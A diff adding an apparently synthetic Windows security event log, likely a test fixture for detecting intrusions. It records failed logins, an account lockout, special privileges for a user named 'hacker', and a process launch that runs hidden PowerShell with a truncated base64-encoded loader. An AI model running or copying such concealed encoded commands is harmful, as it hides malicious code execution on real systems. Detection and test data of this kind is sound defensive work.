@@ -1,0 +1,60 @@
+<Events>
+  <Event>
+    <System>
+      <EventID>4624</EventID>
+      <TimeCreated SystemTime="2026-10-03T10:15:00Z"/>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">admin</Data>
+      <Data Name="IpAddress">10.0.0.5</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-10-03T10:20:00Z"/>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">admin</Data>
+      <Data Name="IpAddress">192.168.1.100</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-10-03T10:20:05Z"/>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">admin</Data>
+      <Data Name="IpAddress">192.168.1.100</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <EventID>4740</EventID>
+      <TimeCreated SystemTime="2026-10-03T10:20:10Z"/>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">admin</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <EventID>4672</EventID>
+      <TimeCreated SystemTime="2026-10-03T10:25:00Z"/>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">hacker</Data>
+    </EventData>
+  </Event>
+  <Event>
+    <System>
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-10-03T10:25:05Z"/>
+    </System>
+    <EventData>
+      <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
+      <Data Name="CommandLine">cmd.exe /c powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...</Data>
+    </EventData>
+  </Event>
+</Events>
